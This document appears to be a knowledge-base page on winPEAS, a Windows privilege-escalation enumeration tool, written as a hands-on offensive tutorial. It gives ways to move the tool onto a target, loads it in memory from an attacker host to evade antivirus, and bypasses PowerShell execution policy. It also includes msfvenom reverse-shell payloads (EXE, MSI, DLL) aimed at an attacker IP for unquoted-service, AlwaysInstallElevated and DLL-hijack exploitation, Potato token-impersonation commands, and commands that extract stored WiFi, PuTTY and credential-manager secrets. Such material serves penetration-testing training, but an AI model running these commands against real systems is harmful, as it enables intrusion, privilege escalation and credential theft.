---
title: "winPEAS"
description: "Windows Privilege Escalation Awesome Script — automated enumeration of privilege escalation vectors on Windows systems. Available as C# executable, PowerShell, and batch script."
category: "privilege-escalation"
tool_name: "winpeas"
mitre_tactic: "privilege_escalation"
mitre_tactic_id: "TA0004"
difficulty: "beginner"
os: ["windows"]
language: ["csharp", "powershell", "batch"]
license: "MIT"
kali_path: "/usr/share/peass-ng/winPEAS"
github: "https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS"
official_docs: "https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html"
install_command: "sudo apt install peass-ng"
---

# winPEAS

winPEAS — Windows Privilege Escalation Awesome Script — is the Windows counterpart of LinPEAS. It automates enumeration of privilege escalation vectors on Windows systems including unquoted service paths, DLL hijacking, kernel exploits, stored credentials, token impersonation, and registry misconfigurations. Available in three flavors: C# executable (.exe), PowerShell script (.ps1), and batch script (.bat).

## 1. Overview

**What It Does:** winPEAS runs comprehensive checks across the Windows system — users, groups, services, scheduled tasks, registry, installed software, stored credentials, tokens, network, and kernel version — then highlights potential privilege escalation paths with color-coded output.

**Why It Matters:** Manual Windows privilege enumeration is complex. The attack surface includes services, scheduled tasks, registry keys, DLL search order, tokens, impersonation, AlwaysInstallElevated, and dozens more vectors. winPEAS automates all of them in a single run.

**Key Distinction:** winPEAS is available in three flavors with different trade-offs. The C# executable is the most feature-complete and fastest. The PowerShell version works in restricted environments. The batch version has the fewest dependencies but the slowest execution.

**Architecture:** The C# version is a .NET Framework application (>= 4.5.2) that uses reflection and WMI queries to enumerate the system. The PowerShell version uses native PowerShell cmdlets and .NET classes. The batch version relies on `wmic`, `reg`, and `net` commands.

**Supported Platforms:** Windows 7, 8, 8.1, 10, 11, Server 2008 R2, 2012, 2012 R2, 2016, 2019, 2022. Both x86 and x64 architectures.

## 2. Installation & Access

### On Kali Linux

```bash
sudo apt install peass-ng
ls /usr/share/peass-ng/winPEAS/
```

**Explanation:** The `peass-ng` package installs winPEAS files into `/usr/share/peass-ng/winPEAS/`. The package includes all three flavors (exe, ps1, bat) for both x86 and x64 architectures.

### Download from GitHub

```bash
# C# executable (recommended)
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe

# PowerShell version
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.ps1

# Batch version
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat
```

**Explanation:** Download the appropriate version for your target. The C# version requires .NET Framework >= 4.5.2 on the target. The PowerShell version works on PowerShell 2.0+.

### Transfer to Windows Target

```bash
# From Kali — Python HTTP server
sudo python3 -m http.server 8000

# On Windows target — PowerShell download
powershell -c "Invoke-WebRequest http://10.10.14.20:8000/winPEASx64.exe -OutFile C:\Temp\winPEAS.exe"

# On Windows target — certutil download (older systems)
certutil -urlcache -split -f http://10.10.14.20:8000/winPEASx64.exe C:\Temp\winPEAS.exe

# SMB share
impacket-smbserver share . -smb2support
copy \\10.10.14.20\share\winPEASx64.exe C:\Temp\

# Bitsadmin (Windows built-in)
bitsadmin /transfer job /download /priority high http://10.10.14.20:8000/winPEASx64.exe C:\Temp\winPEAS.exe
```

**Explanation:** Multiple transfer methods. PowerShell's `Invoke-WebRequest` is the cleanest. `certutil` works on older Windows systems. SMB shares work when HTTP is blocked by firewall.

### Verify Transfer

```cmd
:: Check file exists and size
dir C:\Temp\winPEAS.exe

:: Verify hash matches attacker
powershell -c "Get-FileHash C:\Temp\winPEAS.exe -Algorithm SHA256"
```

**Explanation:** Always verify the file was transferred completely and not tampered with. Compare the hash with the attacker-side hash.

## 3. Core Functionality

### winPEAS Flavors Comparison

| Feature | C# (.exe) | PowerShell (.ps1) | Batch (.bat) |
|---|---|---|---|
| **Speed** | Fastest | Medium | Slowest |
| **Dependencies** | .NET >= 4.5.2 | PowerShell | cmd.exe |
| **Color Output** | Yes | Yes | Yes |
| **Memory Execution** | Yes (with techniques) | Yes | No |
| **AV Evasion** | Better | Moderate | Worst |
| **Feature Coverage** | Full | Full | Partial |
| **Architecture** | Native .NET | Interpreted | Interpreted |
| **Output Quality** | Best | Good | Basic |
| **Recommended** | Primary choice | Restricted environments | Last resort |

### Check Categories

| Category | What It Checks |
|---|---|
| **System Info** | OS version, architecture, hostname, hotfixes, environment variables |
| **Users & Groups** | Local users, groups, administrators, logged-on users, domain info |
| **Users Autologon** | Registry-stored autologon credentials (DefaultUserName, DefaultPassword) |
| **Clipboard Contents** | Current clipboard data (may contain passwords, tokens, sensitive data) |
| **Environment Variables** | PATH hijacking opportunities, sensitive environment variables |
| **Network** | IP config, routes, ARP cache, firewall rules, DNS, proxy settings |
| **Tunneling** | Active port forwards, SSH tunnels, proxy configurations |
| **Processes** | Running processes, process owners, missing DLLs, DLL search order |
| **Services** | Service permissions, unquoted paths, DLL hijacking, writable binary paths |
| **Installed Software** | Software list, version checks, known vulnerable versions, 32-bit on 64-bit |
| **Scheduled Tasks** | Task list, permissions, binary paths, task history |
| **Registry** | AlwaysInstallElevated, Autorun programs, registry permissions, IFEO |
| **Credentials** | Stored passwords, Credential Manager, Vault, browser data, WiFi passwords |
| **Cred Files** | WiFi passwords, PuTTY sessions, KeePass databases, RDP history, vault files |
| **Token Impersonation** | Available tokens, impersonation privileges, Potato attack surface |
| **Kernel Exploits** | Windows version vs known exploits (Potato, PrintNightmare, BlueKeep, etc.) |

## 4. Usage Examples

### C# Executable (Primary)

```cmd
:: Basic execution — full scan
winPEASx64.exe

:: Output to file (with colors preserved via pipe)
winPEASx64.exe > C:\Temp\winpeas_output.txt

:: Silent mode (less output, cleaner)
winPEASx64.exe quietcmd

:: Fast mode (skip time-consuming checks)
winPEASx64.exe fast

:: Quiet + Fast combined
winPEASx64.exe quietcmd fast

:: Specific check only (if supported)
winPEASx64.exe servicesinfo
```

**Explanation:** The C# executable is the recommended version. Use `quietcmd` for cleaner output with fewer banners. Use `fast` to skip slow checks like process monitoring and service enumeration.

### PowerShell Version

```powershell
# Download and execute in memory
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20:8000/winPEAS.ps1')"

# Or save and execute
powershell -ExecutionPolicy Bypass -File winPEAS.ps1

# With output to file
powershell -ExecutionPolicy Bypass -Command "& {IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20:8000/winPEAS.ps1')}" > C:\Temp\output.txt

# With full path
powershell -ExecutionPolicy Bypass -Command "Import-Module C:\Temp\winPEAS.ps1; Invoke-Main"
```

**Explanation:** PowerShell version can execute from memory via `IEX`. Use `-ExecutionPolicy Bypass` to avoid execution policy restrictions. The `-Command` parameter allows inline execution.

### Batch Version

```cmd
:: Basic execution
winPEAS.bat

:: Output to file
winPEAS.bat > C:\Temp\output.txt
```

**Explanation:** The batch version is the simplest but slowest. Use only when PowerShell and .NET are unavailable or blocked.

### Memory Execution (AV Bypass)

```powershell
# Download and execute .NET assembly in memory
powershell -c "$x = (New-Object Net.WebClient).DownloadData('http://10.10.14.20:8000/winPEASx64.exe'); [System.Reflection.Assembly]::Load($x); [PEASS]::Main()"

# Base64 encoded — decode and execute
powershell -c "$b = (New-Object Net.WebClient).DownloadString('http://10.10.14.20:8000/winPEAS64_b64.txt'); [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($b)); [PEASS]::Main()"

# Encoded PowerShell command (avoids command-line logging)
powershell -enc <base64_encoded_command>
```

**Explanation:** Loading .NET assembly from memory avoids writing the binary to disk. The Base64 method adds another layer of obfuscation. The `-enc` parameter accepts a Base64-encoded command string.

### Execute from SMB Share

```bash
# On Kali — start SMB server
impacket-smbserver share /path/to/winPEAS -smb2support

# On Windows
copy \\10.10.14.20\share\winPEASx64.exe C:\Temp\
C:\Temp\winPEASx64.exe
```

**Explanation:** SMB shares work when HTTP is blocked by firewall. Impacket's `smbserver` creates a share on demand.

### Run via PSExec

```bash
# If you have admin access to another host
psexec \\192.168.1.100 -u admin -p password -i -d C:\Temp\winPEASx64.exe
```

**Explanation:** PSExec allows remote execution if you have admin credentials to another machine on the network.

### Execute via WMI

```powershell
# Remote execution via WMI
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "C:\Temp\winPEASx64.exe" -ComputerName 192.168.1.100 -Credential $cred
```

**Explanation:** WMI-based execution works when SMB and PSExec are blocked. Requires valid credentials with admin access.

## 5. Color Coding System

winPEAS uses the same color scheme as LinPEAS:

| Color | Meaning | Action |
|---|---|---|
| **Red on Yellow** | High-confidence PE vector (99% exploitable) | Investigate immediately |
| **Red** | Suspicious configuration | Manual analysis required |
| **Green** | Known good configuration (by name only) | Low priority |
| **Blue** | Informational | Note for context |
| **Light Cyan** | Users with login shell | Note for target selection |
| **Light Magenta** | Current username highlight | Orientation aid |

**Red/Yellow findings** are the ones to exploit first. These represent direct, confirmed misconfigurations with known exploitation techniques documented on HackTricks and LOLBAS.

## 6. Practical Scenarios

### Scenario 1: Initial Windows Shell (Meterpreter)

After getting a Meterpreter session on `192.168.1.100`:

```bash
# Upload winPEAS
upload /usr/share/peass-ng/winPEAS/winPEASexe/winPEAS/winPEASx64.exe C:\Temp\winPEAS.exe

# Execute
execute -f C:\Temp\winPEAS.exe -i -d C:\Temp

# Or via PowerShell
execute -f powershell.exe -a "-ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.20:8000/winPEAS.ps1')"
```

### Scenario 2: Windows Server 2019 — Service Enumeration

```cmd
:: Upload and run
C:\Temp\winPEASx64.exe > C:\Temp\results.txt 2>&1

:: Check for unquoted service paths
findstr /i "unquoted" C:\Temp\results.txt

:: Check for writable service directories
findstr /i "writable" C:\Temp\results.txt

:: Check for DLL hijacking
findstr /i "DLL\|hijack" C:\Temp\results.txt
```

### Scenario 3: Domain-Joined Machine

```cmd
:: winPEAS checks domain users and groups
:: Look for domain admins in local groups
findstr /i "Domain Admins" C:\Temp\results.txt

:: Check cached domain credentials
findstr /i "cached" C:\Temp\results.txt

:: Check Kerberos tickets
findstr /i "kerberos\|ticket" C:\Temp\results.txt
```

### Scenario 4: AV-Restricted Environment

```powershell
# Base64 encode on attacker
base64 winPEASx64.exe > winPEAS64_b64.txt

# Execute from memory on victim
powershell -c "$b = (New-Object Net.WebClient).DownloadString('http://10.10.14.20:8000/winPEAS64_b64.txt'); [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($b)); [PEASS]::Main()"
```

### Scenario 5: Limited User — Find Next Step

```cmd
:: Run as current user (limited privileges)
winPEASx64.exe

:: Focus on:
:: 1. Stored credentials (WiFi, PuTTY, RDP)
:: 2. AlwaysInstallElevated registry keys
:: 3. Service misconfigurations
:: 4. Token impersonation opportunities
:: 5. Kernel exploits for unpatched systems
:: 6. Scheduled task writable paths
:: 7. Registry key permissions
```

### Scenario 6: PowerShell Constrained Language Mode

```cmd
:: When PowerShell is restricted, use C# executable
C:\Temp\winPEASx64.exe

:: Or batch version as last resort
C:\Temp\winPEAS.bat
```

### Scenario 7: Windows 7 Legacy System

```cmd
:: Windows 7 may not have PowerShell 5.1
:: Use C# executable or batch version
C:\Temp\winPEASx64.exe
```

### Scenario 8: Server Core (No GUI)

```cmd
:: Server Core has minimal tools
:: Upload and run winPEAS
C:\Temp\winPEASx64.exe > C:\Temp\results.txt 2>&1
type C:\Temp\results.txt
```

## 7. Key Exploitation Paths Found by winPEAS

### Unquoted Service Paths

```cmd
:: winPEAS finds: "C:\Program Files\My Service\service.exe"
:: Service path contains spaces without quotes
:: Windows searches: C:\Program.exe, C:\Program Files\My.exe, C:\Program Files\My Service\service.exe

:: Exploit — place malicious binary
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.20 LPORT=4444 -f exe -o service.exe
copy service.exe "C:\Program.exe"
sc start "My Service"
```

### AlwaysInstallElevated

```powershell
# winPEAS finds both registry keys set to 1:
# HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1
# HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated = 1

# Exploit — create malicious MSI
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.20 LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

### DLL Hijacking

```cmd
:: winPEAS finds writable directory in service DLL search path
:: Service loads DLLs from: application directory → system32 → system → PATH

:: Create malicious DLL
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.20 LPORT=4444 -f dll -o hijack.dll

:: Place in writable directory
copy hijack.dll "C:\Program Files\Vulnerable App\"

:: Restart service or wait for application to load
```

### Token Impersonation (Potato Attacks)

```powershell
# winPEAS identifies SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
# These privileges allow impersonating other users

# PrintSpoofer (Windows Server 2016/2019/2022)
PrintSpoofer.exe -i -c cmd

# GodPotato (Windows 8-11, Server 2012-2022)
GodPotato.exe -cmd "cmd /c whoami"

# JuicyPotato (Windows Server 2008-2016)
JuicyPotato.exe -l 1337 -p C:\Temp\shell.exe -t * -c {CLSID}

# SweetPotato
SweetPotato.exe -p C:\Temp\shell.exe
```

### Stored Credentials

```cmd
:: winPEAS extracts saved WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="NetworkName" key=clear

:: PuTTY stored sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

:: RDP connection history
reg query "HKCU\Software\Microsoft\Terminal Server Client\Default" /v MrUList

:: Credential Manager
cmdkey /list

:: Unattend.xml / sysprep.xml
dir /s /b C:\*unattend.xml
dir /s /b C:\*sysprep.xml
```

### Kernel Exploits

```powershell
# winPEAS identifies vulnerable kernel version
# Common exploits:

# BlueKeep (CVE-2019-0708) — Windows 7/Server 2008 R2
# PrintNightmare (CVE-2021-34527) — Windows Server 2019
# HIVENightmare (CVE-2021-36934) — Windows 10/11
# PetitPotam (CVE-2021-36942) — Windows Server
# InstallerFileTakeOver (CVE-2021-41379) — Windows 10
# SeriousSAM (CVE-2021-36934) — Windows 10/11

:: Verify kernel version
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix"
```

### Writable Scheduled Tasks

```cmd
:: winPEAS finds scheduled tasks with writable binary paths
:: Task runs as SYSTEM, binary path is writable by current user

:: Find writable task paths
schtasks /query /fo LIST /v | findstr /i "Task To Run"

:: Replace binary
copy shell.exe "C:\Path\To\Writable\task.exe"
```

### Autorun Programs

```cmd
:: winPEAS finds autorun programs with writable binary paths

:: Check registry autorun locations
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

:: Check file autorun locations
dir "C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
```

## 8. Limitations and Caveats

**.NET Requirement:** The C# version requires .NET Framework >= 4.5.2. Windows Server 2008 R2 and earlier may not have this installed by default. Use the PowerShell or batch version as fallback.

**AV Detection:** winPEAS is heavily signatured by antivirus. The C# version triggers most AV engines. Use memory execution or the PowerShell version with obfuscation. The batch version is least likely to be flagged but also least capable.

**Output Volume:** winPEAS produces extensive output — often 1000+ lines. Focus on Red/Yellow findings. Use `findstr` or text editors to filter. The `quietcmd` flag reduces banner noise.

**No Exploitation:** Like LinPEAS, winPEAS finds paths but does not exploit them. You must understand the exploitation technique for each finding. Reference LOLBAS and HackTricks for exploitation guidance.

**Domain Limitations:** winPEAS performs local enumeration only. It does not enumerate Active Directory beyond local group memberships. Use BloodHound for AD enumeration, or SharpHound for data collection.

**PowerShell Restrictions:** Constrained Language Mode (via AppLocker or WDAC) blocks the PowerShell version. Use the C# executable in these environments.

**Batch Version Incomplete:** The batch version checks fewer vectors than the C# or PowerShell versions. It misses some service checks, token checks, and registry analysis. Use it only as a last resort.

**No Password Brute-force:** Unlike LinPEAS, winPEAS does not brute-force user passwords. It extracts stored credentials but does not attempt online brute-force. Use other tools for that.

**32-bit vs 64-bit:** Use `winPEASx86.exe` on 32-bit systems. The x64 version will not run on 32-bit Windows. Use the correct architecture.

**Execution Policy:** PowerShell execution policy may block the .ps1 version. Use `-ExecutionPolicy Bypass` or the C# executable instead.

## 9. Resources

- **GitHub Repository:** https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
- **PEASS-ng Main Repository:** https://github.com/peass-ng/PEASS-ng
- **HackTricks Windows PE Checklist:** https://book.hacktricks.wiki/en/windows-hardening/checklist-windows-privilege-escalation.html
- **HackTricks Windows PE Techniques:** https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html
- **PEASS Releases:** https://github.com/peass-ng/PEASS-ng/releases/latest
- **LOLBAS (Living Off The Land Binaries):** https://lolbas-project.github.io/
- **GTFOBins (Linux equivalents):** https://gtfobins.github.io/
- **Windows Exploit Suggester:** https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- **BloodHound (AD Enumeration):** https://github.com/BloodHoundAD/BloodHound
